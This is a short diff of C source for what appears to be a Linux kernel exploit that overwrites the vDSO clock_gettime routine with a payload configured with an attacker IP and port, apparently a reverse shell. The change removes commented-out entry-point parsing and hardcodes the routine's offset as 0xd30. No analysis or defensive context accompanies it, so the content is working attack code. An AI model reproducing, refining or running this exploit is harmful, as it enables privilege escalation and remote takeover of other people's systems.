@@ -216,13 +216,10 @@ static int build_vdso_patch(void *vdso_addr)
     uint32_t clock_gettime_offset, target;
     unsigned long clock_gettime_addr;
     unsigned char *p, *buf;
-//    uint64_t entry_point;
     int i;
 
     /* e_entry */
     p = vdso_addr;
-//    entry_point = *(uint64_t *)(p + 0x18);
-//    clock_gettime_offset = (uint32_t)entry_point & 0xfff;
     clock_gettime_offset = (uint32_t)0xd30;
     clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;
 
@@ -571,12 +568,9 @@ static struct prologue *fingerprint_prologue(void *vdso_addr)
 {
     unsigned long clock_gettime_addr;
     uint32_t clock_gettime_offset;
-//    uint64_t entry_point;
     struct prologue *p = &prologue;
 
     /* e_entry */
-//    entry_point = *(uint64_t *)((unsigned char *)vdso_addr + 0x18);
-//    clock_gettime_offset = (uint32_t)entry_point & 0xfff;
     clock_gettime_offset = (uint32_t)0xd30;
     clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;
 
@@ -646,7 +640,6 @@ int main(int argc, char *argv[])
     if (patch_payload(p, ip, port) == -1)
         return EXIT_FAILURE;
 
-//    if (build_vdso_patch(arg.vdso_addr, p) == -1)
     if (build_vdso_patch(arg.vdso_addr) == -1)
         return EXIT_FAILURE;
 
